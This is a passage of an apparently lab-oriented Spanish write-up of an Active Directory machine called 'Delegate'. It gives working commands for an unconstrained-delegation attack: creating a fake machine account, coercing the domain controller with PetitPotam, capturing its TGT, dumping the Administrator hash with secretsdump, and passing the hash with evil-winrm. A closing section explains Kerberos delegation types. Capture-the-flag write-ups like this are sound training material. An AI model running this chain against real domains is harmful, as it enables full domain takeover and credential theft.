+<li>Fuerza al DC a autenticarse contra esa máquina (coacción de autenticación — piensa en <code>PrinterBug</code>/<code>PetitPotam</code>/<code>spoolsample</code>)</li>
+<li>Como la delegación no está restringida, tu máquina falsa recibe el <strong>TGT completo del DC$</strong> cacheado</li>
+<li>Con ese TGT haces DCSync limpio como cuenta de máquina del DC</li>
+</ul>
+<p>cremos la cuenta</p>
+<div class="highlight"><pre><span></span><code>addcomputer.py -computer-name 'FAKEPC$' -computer-pass 'Password123!' -dc-ip 10.129.234.69 delegate.vl/N.Thompson:'KALEB_2341'
+</code></pre></div>
+<p><img alt="Pasted image 20260921003649.png" src="../assets/Pasted%20image%2020260921003649.png" /></p>
+<p>luego</p>
+<div class="highlight"><pre><span></span><code>bloodyAD -u 'N.Thompson' -d 'delegate.vl' -p 'KALEB_2341' --host '10.129.234.69' add uac 'FAKEPC$' -f TRUSTED_FOR_DELEGATION
+</code></pre></div>
+<p>que hace: </p>
+<p>Marcamos <code>FAKEPC$</code> como <strong>trusted for unconstrained delegation</strong>. En términos prácticos: ahora cualquier equipo (incluido el DC) que se autentique vía Kerberos contra un servicio corriendo en <code>FAKEPC$</code> va a <strong>enviarle su TGT completo</strong>, cacheado, listo para que tú lo extraigas y lo reutilices como si fueras esa cuenta.</p>
+<p>aora necesitamoa un SPN válido para que el DC "confíe" en autenticarse contra ella eso lo asemos con krbrelayx</p>
+<div class="highlight"><pre><span></span><code>~/.local/share/pipx/venvs/impacket/bin/python3 addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/fakepc' -t 'FAKEPC$' -dc-ip 10.129.234.69 10.129.234.69
+</code></pre></div>
+<p><img alt="Pasted image 20260921004907.png" src="../assets/Pasted%20image%2020260921004907.png" /></p>
+<p>luego agrega el registro DNS con <code>dnstool.py</code></p>
+<div class="highlight"><pre><span></span><code>~/.local/share/pipx/venvs/impacket/bin/python3 dnstool.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -r fakepc.delegate.vl -d &lt;TU_IP_TUN0&gt; --action add 10.129.234.69
+</code></pre></div>
+<p><img alt="Pasted image 20260921005127.png" src="../assets/Pasted%20image%2020260921005127.png" /></p>
+<p>nota: Verifica que resolvió antes de seguir (puede tardar hasta 180s por replicación):</p>
+<div class="highlight"><pre><span></span><code>sleep 180 &amp;&amp; dig fakepc.delegate.vl @10.129.234.69
+</code></pre></div>
+<p>asi que mientras jeneramos el hash dela cuenta que creamos</p>
+<div class="highlight"><pre><span></span><code>~/.local/share/pipx/venvs/impacket/bin/python3 -c 'from Crypto.Hash import MD4; print(MD4.new("Password123!".encode("utf-16le")).hexdigest())'
+</code></pre></div>
+<p><img alt="Pasted image 20260921005634.png" src="../assets/Pasted%20image%2020260921005634.png" /></p>
+<p>luego miramos y DNS resuelto</p>
+<p><img alt="Pasted image 20260921005723.png" src="../assets/Pasted%20image%2020260921005723.png" /></p>
+<p>Todo listo para el listener. Desde <code>~/delegate/loot/krbrelayx</code></p>
+<div class="highlight"><pre><span></span><code>sudo ~/.local/share/pipx/venvs/impacket/bin/python3 krbrelayx.py -hashes :2b576acbe6bcfda7294d6bd18041b8fe
+</code></pre></div>
+<p>Ahora, en una <strong>segunda terminal</strong>, toca disparar el ataque de coacción de autenticación con PetitPotam.</p>
+<p>comandos juntos para clonar y ejecutar la herramienta</p>
+<div class="highlight"><pre><span></span><code>git clone https://github.com/topotam/PetitPotam
+cd PetitPotam
+~/.local/share/pipx/venvs/impacket/bin/python3 PetitPotam.py -target-ip 10.129.234.69 -u 'FAKEPC$' -p 'Password123!' fakepc dc1.delegate.vl
+</code></pre></div>
+<p><img alt="Pasted image 20260921010139.png" src="../assets/Pasted%20image%2020260921010139.png" /></p>
+<p>y Capturamos el TGT de <code>DC1$@DELEGATE.VL</code> — dos veces incluso, guardado como <code>.ccache</code>. Esto es lo que necesitabamos</p>
+<p><img alt="Pasted image 20260921010408.png" src="../assets/Pasted%20image%2020260921010408.png" /></p>
+<p>ya con esto corremos el secretsdump todo junto</p>
+<div class="highlight"><pre><span></span><code>KRB5CCNAME='DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache' secretsdump.py -just-dc-user Administrator -k dc1.delegate.vl -no-pass
+</code></pre></div>
+<p><img alt="Pasted image 20260921010518.png" src="../assets/Pasted%20image%2020260921010518.png" /></p>
+<div class="highlight"><pre><span></span><code>c32198ceab4cc695e65045562aa3ee93
+</code></pre></div>
+<p>ya con esto pass the hash</p>
+<div class="highlight"><pre><span></span><code>evil-winrm -i 10.129.234.69 -u Administrator -H c32198ceab4cc695e65045562aa3ee93
+</code></pre></div>
+<p><img alt="Pasted image 20260921010621.png" src="../assets/Pasted%20image%2020260921010621.png" /></p>
+<div class="highlight"><pre><span></span><code>3e8f1a4be474351a7c1134b40fb5568d
+</code></pre></div>
+<p>pero que es esto dela delegaciones y deque consiste</p>
+<p><strong>¿Qué es "delegación" en Kerberos?</strong></p>
+<p>Kerberos delegation es un mecanismo legítimo diseñado para un problema real: imagina un servidor web que necesita acceder a una base de datos <strong>en nombre del usuario que se conectó</strong>, no en nombre del servidor mismo. Si Ana se loguea en <code>webapp.empresa.com</code> y esa app necesita consultar <code>sqlserver.empresa.com</code> con los permisos de Ana (no con una cuenta de servicio genérica), el servidor web necesita una forma de "hacerse pasar por Ana" ante el siguiente salto. Eso es delegación: un servidor autorizado a reutilizar la identidad de otro usuario para saltar a un tercer sistema.</p>
+<p>Hay tres tipos, de más peligroso a más seguro:</p>
+<p><strong>1. Unconstrained Delegation (la que usaste)</strong><br />
+El servidor delegado recibe una <strong>copia completa del TGT</strong> de cualquiera que se autentique contra él, sin restricción de a dónde puede usarlo después. Es la versión "cheque en blanco": si Ana se conecta a tu servidor, tú te quedas con su TGT completo y puedes hacerte pasar por Ana ante <em>cualquier</em> servicio del dominio, no solo el que originalmente necesitabas. Por eso es tan peligroso — y por eso tu ataque funcionó: forzaste al DC (<code>DC1$</code>) a autenticarse contra tu <code>FAKEPC$</code>, y como estaba marcada como unconstrained, te quedaste con su TGT completo, que te sirve para actuar como el propio controlador de dominio.</p>
+<p><strong>2. Constrained Delegation</strong><br />
+Versión más sana: el servidor solo puede delegar hacia <strong>servicios específicos</strong> predefinidos (por SPN), no hacia cualquier cosa. Ana se conecta a tu server, tú puedes usar su identidad, pero <em>solo</em> para hablar con <code>sql/sqlserver.empresa.com</code>, no con todo el dominio. Aun así, es explotable si logras comprometer la cuenta con este permiso configurado (puedes pedir tickets de servicio para cualquier usuario que se haya autenticado, hacia el servicio permitido).</p>
+<p><strong>3. Resource-Based Constrained Delegation (RBCD)</strong><br />
+Invierte el modelo: en vez de que el servidor origen decida a quién puede impersonar, es el <strong>recurso destino</strong> el que decide quién puede delegar hacia él (vía el atributo <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>). Es el más moderno y "seguro" de los tres, pero también abusable si tienes <code>GenericWrite</code>/<code>GenericAll</code> sobre un computer object — puedes configurar tu propia cuenta como "permitida para delegar" hacia esa máquina y luego pedir un ticket de servicio como cualquier usuario (incluido un Domain Admin) hacia ella.</p>
+<p><strong>Por qué tu cadena específica funcionó:</strong><br />
+Tenías <code>SeEnableDelegationPrivilege</code> — un privilegio de <strong>usuario</strong> (no de ACL sobre un objeto) que te permite marcar <em>cualquier</em> cuenta como unconstrained. Normalmente solo lo tienen Domain Admins, así que encontrarlo en una cuenta normal es la señal de que el lab está diseñado alrededor de este abuso específico. Combinado con <code>SeMachineAccountPrivilege</code> (crear cuentas de máquina), pudiste fabricar tu propia "trampa" (<code>FAKEPC$</code>) y usar PetitPotam para forzar al DC a caer en ella — capturando su TGT y usándolo para el DCSync final.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver al principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Pie" >
+        
+          
+          <a href="../babytwo/" class="md-footer__link md-footer__link--prev" aria-label="Anterior: BabyTwo">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Anterior
+              </span>
+              <div class="md-ellipsis">
+                BabyTwo
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../tombwatcher/" class="md-footer__link md-footer__link--next" aria-label="Siguiente: TombWatcher">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Siguiente
+              </span>
+              <div class="md-ellipsis">
+                TombWatcher
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.indexes", "navigation.top", "navigation.instant", "navigation.footer", "search.suggest", "search.highlight", "content.code.copy", "toc.follow"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
